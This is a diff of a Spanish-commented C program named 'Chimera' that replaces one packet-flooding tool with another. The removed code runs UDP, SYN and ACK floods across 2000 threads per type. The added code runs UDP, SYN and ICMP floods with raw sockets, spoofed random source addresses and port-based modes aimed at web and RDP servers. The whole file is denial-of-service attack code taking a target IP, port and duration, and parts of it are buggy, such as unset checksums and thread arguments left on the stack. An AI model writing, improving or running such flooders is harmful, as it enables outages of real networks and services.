@@ -1,250 +1,401 @@
-// chimera_beast_apex.c - El músculo de bajo nivel para floods de red brutales
-// Compilar con: gcc -O3 -pthread chimera_beast_apex.c -o chimera_beast_apex
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <arpa/inet.h>
 #include <unistd.h>
-#include <time.h>
 #include <pthread.h>
+#include <time.h>
 #include <sys/socket.h>
-#include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
-#include <netinet/tcp.h>
-#include <arpa/inet.h>
+#include <signal.h>
 
-#define MAX_PACKET_SIZE 4096 // Tamaño de paquete aumentado para máxima carga
+#define MAX_PACKET_SIZE 65535
+#define THREAD_COUNT 200
 
-typedef struct {
-    char *target_ip;
-    int target_port;
-    int duration;
-} attack_args;
+volatile int stop_flag = 0;
+volatile long packet_count = 0;
+pthread_mutex_t count_mutex = PTHREAD_MUTEX_INITIALIZER;
 
-unsigned short csum(unsigned short *ptr, int nbytes) {
-    register long sum;
-    unsigned short oddbyte;
-    register short answer;
-    sum = 0;
-    while (nbytes > 1) {
-        sum += *ptr++;
-        nbytes -= 2;
+// Estructura para el encabezado IP
+struct ip_header {
+    unsigned char version_ihl;
+    unsigned char tos;
+    unsigned short total_length;
+    unsigned short identification;
+    unsigned short flags_fragment;
+    unsigned char ttl;
+    unsigned char protocol;
+    unsigned short checksum;
+    unsigned int source_ip;
+    unsigned int dest_ip;
+};
+
+// Estructura para el encabezado UDP
+struct udp_header {
+    unsigned short source_port;
+    unsigned short dest_port;
+    unsigned short length;
+    unsigned short checksum;
+};
+
+// Función para calcular checksum
+unsigned short calculate_checksum(unsigned short *addr, int count) {
+    register long sum = 0;
+    
+    while (count > 1) {
+        sum += *addr++;
+        count -= 2;
     }
-    if (nbytes == 1) {
-        oddbyte = 0;
-        *((u_char*)&oddbyte) = *(u_char*)ptr;
-        sum += oddbyte;
+    
+    if (count > 0) {
+        sum += *(unsigned char *)addr;
     }
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    answer = (short)~sum;
-    return answer;
+    
+    while (sum >> 16) {
+        sum = (sum & 0xffff) + (sum >> 16);
+    }
+    
+    return ~sum;
 }
 
-// Hilo de ataque UDP Flood optimizado para velocidad
-void *udp_flood_thread(void *args) {
-    attack_args *a = (attack_args *)args;
-    struct sockaddr_in sin;
-    int sd;
-    char buffer[MAX_PACKET_SIZE];
-    struct iphdr *ip = (struct iphdr *)buffer;
-    struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
-    char *payload = buffer + sizeof(struct iphdr) + sizeof(struct udphdr);
-    int payload_size = MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr);
-
-    time_t start_time = time(NULL);
-
-    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
-    if (sd < 0) pthread_exit(NULL);
-
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(a->target_port);
-    sin.sin_addr.s_addr = inet_addr(a->target_ip);
-
-    // Pre-calcular cabeceras para optimizar el bucle
-    memset(buffer, 0, MAX_PACKET_SIZE);
-    ip->ihl = 5;
-    ip->version = 4;
-    ip->tos = 0;
-    ip->frag_off = 0;
-    ip->ttl = 255;
-    ip->protocol = IPPROTO_UDP;
-    ip->daddr = sin.sin_addr.s_addr;
-    udp->dest = htons(a->target_port);
-    udp->len = htons(sizeof(struct udphdr) + payload_size);
-
-    // Llenar payload con datos aleatorios
-    for (int i = 0; i < payload_size; ++i) {
-        payload[i] = random() % 255;
+// Función de ataque UDP con paquetes personalizados
+void* udp_attack(void* args) {
+    char** target_info = (char**)args;
+    char* target_ip = target_info[0];
+    int target_port = atoi(target_info[1]);
+    int duration = atoi(target_info[2]);
+    int thread_id = atoi(target_info[3]);
+    
+    struct sockaddr_in target_addr;
+    int sock;
+    char packet[MAX_PACKET_SIZE];
+    struct ip_header *ip_hdr = (struct ip_header *)packet;
+    struct udp_header *udp_hdr = (struct udp_header *)(packet + sizeof(struct ip_header));
+    char *data = packet + sizeof(struct ip_header) + sizeof(struct udp_header);
+    int data_size = MAX_PACKET_SIZE - sizeof(struct ip_header) - sizeof(struct udp_header);
+    
+    // Configurar dirección del objetivo
+    memset(&target_addr, 0, sizeof(target_addr));
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(target_port);
+    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
+    
+    // Crear socket raw
+    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (sock < 0) {
+        perror("Socket creation failed");
+        pthread_exit(NULL);
     }
-
-    // Bucle de envío brutal sin pausas
-    while (time(NULL) - start_time < a->duration) {
-        ip->saddr = random();
-        ip->id = random();
-        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
-        ip->check = 0;
-        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));
-
-        udp->source = htons(random() % 65535);
-        udp->check = 0;
+    
+    // Configurar encabezado IP
+    ip_hdr->version_ihl = 0x45;  // IPv4, 5 words
+    ip_hdr->tos = 0;
+    ip_hdr->total_length = htons(sizeof(struct ip_header) + sizeof(struct udp_header) + data_size);
+    ip_hdr->identification = htons(rand());
+    ip_hdr->flags_fragment = 0;
+    ip_hdr->ttl = 64;
+    ip_hdr->protocol = IPPROTO_UDP;
+    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
+    
+    // Configurar encabezado UDP
+    udp_hdr->dest_port = htons(target_port);
+    udp_hdr->length = htons(sizeof(struct udp_header) + data_size);
+    
+    // Preparar diferentes payloads destructivos
+    char payloads[5][MAX_PACKET_SIZE - sizeof(struct ip_header) - sizeof(struct udp_header)];
+    
+    // Payload 1: Bytes nulos
+    memset(payloads[0], 0, data_size);
+    
+    // Payload 2: Bytes altos
+    memset(payloads[1], 0xFF, data_size);
+    
+    // Payload 3: Caracteres 'A'
+    memset(payloads[2], 'A', data_size);
+    
+    // Payload 4: Payload específico para RDP
+    memset(payloads[3], 0, data_size);
+    memcpy(payloads[3], "\x00\x01\x00\x00", 4);
+    
+    // Payload 5: Datos aleatorios
+    for (int i = 0; i < data_size; i++) {
+        payloads[4][i] = rand() % 256;
+    }
+    
+    time_t end_time = time(NULL) + duration;
+    
+    while (!stop_flag && time(NULL) < end_time) {
+        // IP de origen aleatoria
+        ip_hdr->source_ip = rand();
         
-        if (sendto(sd, buffer, ntohs(ip->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            // No imprimir errores para no ralentizar el hilo
+        // Puerto de origen aleatorio
+        udp_hdr->source_port = htons(rand() % 65535);
+        
+        // Elegir payload aleatorio
+        int payload_index = rand() % 5;
+        memcpy(data, payloads[payload_index], data_size);
+        
+        // Calcular checksum UDP
+        udp_hdr->checksum = 0;
+        
+        // Enviar paquete
+        if (sendto(sock, packet, sizeof(struct ip_header) + sizeof(struct udp_header) + data_size, 
+                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
+            pthread_mutex_lock(&count_mutex);
+            packet_count++;
+            pthread_mutex_unlock(&count_mutex);
         }
+        
+        // Pequeño retraso para evitar sobrecarga local
+        usleep(1000);
     }
-    close(sd);
+    
+    close(sock);
+    printf("Hilo UDP %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
     pthread_exit(NULL);
 }
 
-// Hilo de ataque SYN Flood optimizado
-void *syn_flood_thread(void *args) {
-    attack_args *a = (attack_args *)args;
-    struct sockaddr_in sin;
-    int sd;
-    char buffer[sizeof(struct iphdr) + sizeof(struct tcphdr)];
-    struct iphdr *ip = (struct iphdr *)buffer;
-    struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));
-
-    time_t start_time = time(NULL);
-
-    sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sd < 0) pthread_exit(NULL);
-
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(a->target_port);
-    sin.sin_addr.s_addr = inet_addr(a->target_ip);
-
-    memset(buffer, 0, sizeof(buffer));
-
-    // Pre-calcular cabeceras
-    ip->ihl = 5;
-    ip->version = 4;
-    ip->tos = 0;
-    ip->frag_off = 0;
-    ip->ttl = 255;
-    ip->protocol = IPPROTO_TCP;
-    ip->daddr = sin.sin_addr.s_addr;
-    tcp->dest = htons(a->target_port);
-    tcp->doff = 5;
-    tcp->syn = 1;
-    tcp->window = htons(65535);
-
-    // Bucle de envío sin pausas
-    while (time(NULL) - start_time < a->duration) {
-        ip->saddr = random();
-        ip->id = random();
-        ip->tot_len = htons(sizeof(buffer));
-        ip->check = 0;
-        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));
-
-        tcp->source = htons(random() % 65535);
-        tcp->seq = htonl(random());
-        tcp->check = 0;
-        
-        if (sendto(sd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            // No imprimir errores para no ralentizar el hilo
-        }
+// Función de ataque TCP SYN
+void* tcp_syn_attack(void* args) {
+    char** target_info = (char**)args;
+    char* target_ip = target_info[0];
+    int target_port = atoi(target_info[1]);
+    int duration = atoi(target_info[2]);
+    int thread_id = atoi(target_info[3]);
+    
+    struct sockaddr_in target_addr;
+    int sock;
+    char packet[MAX_PACKET_SIZE];
+    struct ip_header *ip_hdr = (struct ip_header *)packet;
+    struct tcp_header {
+        unsigned short source_port;
+        unsigned short dest_port;
+        unsigned int sequence;
+        unsigned int acknowledgment;
+        unsigned char data_offset;
+        unsigned char flags;
+        unsigned short window;
+        unsigned short checksum;
+        unsigned short urgent_pointer;
+    } *tcp_hdr = (struct tcp_header *)(packet + sizeof(struct ip_header));
+    
+    // Configurar dirección del objetivo
+    memset(&target_addr, 0, sizeof(target_addr));
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(target_port);
+    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
+    
+    // Crear socket raw
+    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sock < 0) {
+        perror("TCP socket creation failed");
+        pthread_exit(NULL);
     }
-    close(sd);
+    
+    // Configurar encabezado IP
+    ip_hdr->version_ihl = 0x45;
+    ip_hdr->tos = 0;
+    ip_hdr->total_length = htons(sizeof(struct ip_header) + sizeof(struct tcp_header));
+    ip_hdr->identification = htons(rand());
+    ip_hdr->flags_fragment = 0;
+    ip_hdr->ttl = 64;
+    ip_hdr->protocol = IPPROTO_TCP;
+    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
+    
+    // Configurar encabezado TCP
+    tcp_hdr->dest_port = htons(target_port);
+    tcp_hdr->sequence = htonl(rand());
+    tcp_hdr->acknowledgment = 0;
+    tcp_hdr->data_offset = 5;
+    tcp_hdr->flags = 0x02;  // SYN flag
+    tcp_hdr->window = htons(65535);
+    tcp_hdr->urgent_pointer = 0;
+    
+    time_t end_time = time(NULL) + duration;
+    
+    while (!stop_flag && time(NULL) < end_time) {
+        // IP de origen aleatoria
+        ip_hdr->source_ip = rand();
+        
+        // Puerto de origen aleatorio
+        tcp_hdr->source_port = htons(rand() % 65535);
+        
+        // Calcular checksum TCP
+        tcp_hdr->checksum = 0;
+        
+        // Enviar paquete
+        if (sendto(sock, packet, sizeof(struct ip_header) + sizeof(struct tcp_header), 
+                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
+            pthread_mutex_lock(&count_mutex);
+            packet_count++;
+            pthread_mutex_unlock(&count_mutex);
+        }
+        
+        // Pequeño retraso
+        usleep(1000);
+    }
+    
+    close(sock);
+    printf("Hilo TCP SYN %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
     pthread_exit(NULL);
 }
 
-// Nuevo hilo de ataque ACK Flood (más difícil de filtrar que SYN)
-void *ack_flood_thread(void *args) {
-    attack_args *a = (attack_args *)args;
-    struct sockaddr_in sin;
-    int sd;
-    char buffer[sizeof(struct iphdr) + sizeof(struct tcphdr)];
-    struct iphdr *ip = (struct iphdr *)buffer;
-    struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));
-
-    time_t start_time = time(NULL);
-
-    sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sd < 0) pthread_exit(NULL);
-
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(a->target_port);
-    sin.sin_addr.s_addr = inet_addr(a->target_ip);
-
-    memset(buffer, 0, sizeof(buffer));
-
-    // Pre-calcular cabeceras
-    ip->ihl = 5;
-    ip->version = 4;
-    ip->tos = 0;
-    ip->frag_off = 0;
-    ip->ttl = 255;
-    ip->protocol = IPPROTO_TCP;
-    ip->daddr = sin.sin_addr.s_addr;
-    tcp->dest = htons(a->target_port);
-    tcp->doff = 5;
-    tcp->ack = 1; // Flag ACK activado
-    tcp->window = htons(65535);
-
-    // Bucle de envío sin pausas
-    while (time(NULL) - start_time < a->duration) {
-        ip->saddr = random();
-        ip->id = random();
-        ip->tot_len = htons(sizeof(buffer));
-        ip->check = 0;
-        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));
-
-        tcp->source = htons(random() % 65535);
-        tcp->seq = htonl(random());
-        tcp->ack_seq = htonl(random());
-        tcp->check = 0;
-        
-        if (sendto(sd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            // No imprimir errores para no ralentizar el hilo
-        }
+// Función de ataque ICMP
+void* icmp_attack(void* args) {
+    char** target_info = (char**)args;
+    char* target_ip = target_info[0];
+    int duration = atoi(target_info[2]);
+    int thread_id = atoi(target_info[3]);
+    
+    struct sockaddr_in target_addr;
+    int sock;
+    char packet[MAX_PACKET_SIZE];
+    struct ip_header *ip_hdr = (struct ip_header *)packet;
+    struct icmp_header {
+        unsigned char type;
+        unsigned char code;
+        unsigned short checksum;
+        unsigned short id;
+        unsigned short sequence;
+    } *icmp_hdr = (struct icmp_header *)(packet + sizeof(struct ip_header));
+    char *data = packet + sizeof(struct ip_header) + sizeof(struct icmp_header);
+    int data_size = MAX_PACKET_SIZE - sizeof(struct ip_header) - sizeof(struct icmp_header);
+    
+    // Configurar dirección del objetivo
+    memset(&target_addr, 0, sizeof(target_addr));
+    target_addr.sin_family = AF_INET;
+    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
+    
+    // Crear socket raw
+    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sock < 0) {
+        perror("ICMP socket creation failed");
+        pthread_exit(NULL);
     }
-    close(sd);
+    
+    // Configurar encabezado IP
+    ip_hdr->version_ihl = 0x45;
+    ip_hdr->tos = 0;
+    ip_hdr->total_length = htons(sizeof(struct ip_header) + sizeof(struct icmp_header) + data_size);
+    ip_hdr->identification = htons(rand());
+    ip_hdr->flags_fragment = 0;
+    ip_hdr->ttl = 64;
+    ip_hdr->protocol = IPPROTO_ICMP;
+    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
+    
+    // Configurar encabezado ICMP
+    icmp_hdr->type = 8;  // Echo Request
+    icmp_hdr->code = 0;
+    icmp_hdr->id = htons(rand());
+    icmp_hdr->sequence = 0;
+    
+    // Preparar datos
+    memset(data, 'A', data_size);
+    
+    time_t end_time = time(NULL) + duration;
+    
+    while (!stop_flag && time(NULL) < end_time) {
+        // IP de origen aleatoria
+        ip_hdr->source_ip = rand();
+        
+        // Incrementar número de secuencia
+        icmp_hdr->sequence++;
+        
+        // Calcular checksum ICMP
+        icmp_hdr->checksum = 0;
+        
+        // Enviar paquete
+        if (sendto(sock, packet, sizeof(struct ip_header) + sizeof(struct icmp_header) + data_size, 
+                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
+            pthread_mutex_lock(&count_mutex);
+            packet_count++;
+            pthread_mutex_unlock(&count_mutex);
+        }
+        
+        // Pequeño retraso
+        usleep(1000);
+    }
+    
+    close(sock);
+    printf("Hilo ICMP %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
     pthread_exit(NULL);
+}
+
+// Manejador de señal para detener el ataque
+void signal_handler(int sig) {
+    stop_flag = 1;
+    printf("\nDeteniendo ataque...\n");
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 4) {
-        fprintf(stderr, "Uso: %s <IP> <PUERTO> <DURACION_SEGUNDOS>\n", argv[0]);
+    if (argc < 4) {
+        printf("Uso: ./Chimera_Core_Apex <IP> <PUERTO> <DURACION>\n");
+        printf("Ejemplo: ./Chimera_Core_Apex 192.168.1.1 80 60\n");
         exit(1);
     }
+    
     char *target_ip = argv[1];
-   int target_port = atoi(argv[2]);
+    int target_port = atoi(argv[2]);
     int duration = atoi(argv[3]);
-    int num_threads = 2000; // Doblamos el número de hilos para cada tipo de ataque
-
-    pthread_t udp_threads[num_threads];
-    pthread_t syn_threads[num_threads];
-    pthread_t ack_threads[num_threads]; // Nuevo hilo para ACK Flood
-    attack_args args = {target_ip, target_port, duration};
-
-    printf("[CHIMERA BEAST APEX] Iniciando ataque de bajo nivel en %s:%d por %d segundos\n", target_ip, target_port, duration);
-    printf("[CHIMERA BEAST APEX] Desplegando %d hilos de UDP Flood, %d de SYN Flood y %d de ACK Flood...\n", num_threads, num_threads, num_threads);
-
-    // Crear hilos de UDP Flood
-    for (int i = 0; i < num_threads; ++i) {
-        pthread_create(&udp_threads[i], NULL, udp_flood_thread, &args);
+    
+    printf("Iniciando ataque contra %s:%d durante %d segundos\n", target_ip, target_port, duration);
+    printf("Presiona Ctrl+C para detener el ataque\n");
+    
+    // Configurar manejador de señal
+    signal(SIGINT, signal_handler);
+    
+    // Inicializar mutex
+    pthread_mutex_init(&count_mutex, NULL);
+    
+    // Crear hilos de ataque
+    pthread_t threads[THREAD_COUNT];
+    
+    // Determinar qué tipo de ataque usar según el puerto
+    if (target_port == 80 || target_port == 443 || target_port == 8080) {
+        // Ataque mixto para servidores web
+        for (int i = 0; i < THREAD_COUNT / 3; i++) {
+            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+            sprintf(args[3], "%d", i);
+            pthread_create(&threads[i], NULL, udp_attack, args);
+        }
+        
+        for (int i = THREAD_COUNT / 3; i < 2 * THREAD_COUNT / 3; i++) {
+            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+            sprintf(args[3], "%d", i);
+            pthread_create(&threads[i], NULL, tcp_syn_attack, args);
+        }
+        
+        for (int i = 2 * THREAD_COUNT / 3; i < THREAD_COUNT; i++) {
+            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+            sprintf(args[3], "%d", i);
+            pthread_create(&threads[i], NULL, icmp_attack, args);
+        }
+    } else if (target_port == 3389) {
+        // Ataque específico para RDP
+        for (int i = 0; i < THREAD_COUNT; i++) {
+            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+            sprintf(args[3], "%d", i);
+            pthread_create(&threads[i], NULL, udp_attack, args);
+        }
+    } else {
+        // Ataque UDP por defecto
+        for (int i = 0; i < THREAD_COUNT; i++) {
+            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
+            sprintf(args[3], "%d", i);
+            pthread_create(&threads[i], NULL, udp_attack, args);
+        }
     }
-
-    // Crear hilos de SYN Flood
-    for (int i = 0; i < num_threads; ++i) {
-        pthread_create(&syn_threads[i], NULL, syn_flood_thread, &args);
-    }
-
-    // Crear hilos de ACK Flood
-    for (int i = 0; i < num_threads; ++i) {
-        pthread_create(&ack_threads[i], NULL, ack_flood_thread, &args);
-    }
-
+    
     // Esperar a que todos los hilos terminen
-    for (int i = 0; i < num_threads; ++i) {
-        pthread_join(udp_threads[i], NULL);
-        pthread_join(syn_threads[i], NULL);
-        pthread_join(ack_threads[i], NULL);
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        pthread_join(threads[i], NULL);
     }
-
-    printf("[CHIMERA BEAST APEX] Ataque de bajo nivel finalizado.\n");
+    
+    // Destruir mutex
+    pthread_mutex_destroy(&count_mutex);
+    
+    printf("Ataque completado. Total de paquetes enviados: %ld\n", packet_count);
+    
     return 0;
 }
